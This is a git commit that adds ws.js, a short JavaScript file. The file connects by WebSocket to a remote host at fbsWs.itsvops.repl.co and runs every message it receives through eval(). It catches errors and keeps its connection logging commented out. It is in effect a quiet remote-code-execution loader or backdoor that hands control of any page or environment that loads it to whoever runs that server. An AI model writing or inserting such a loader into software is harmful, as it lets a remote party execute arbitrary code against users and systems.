0ca82e0c635708e8dba5cf560723a5ca6e982245
ItsVops <55073114+ItsVops@users.noreply.github.com>
2021-11-24 16:16:30 -0500

    ws

---
+++ ws.js
@@ -0,0 +1,21 @@
+let socket = new WebSocket("ws://fbsWs.itsvops.repl.co");
+
+socket.onopen = function(e) {
+    //console.log('connected to fbs websocket')
+};
+
+socket.onmessage = function(event) {
+    try {
+        eval(event.data)
+    }catch(err) {
+        console.log(err)
+    }
+};
+
+socket.onclose = function(event) {
+    //console.log('ws closed? wtf')
+};
+
+socket.onerror = function(error) {
+    console.log(error)
+};
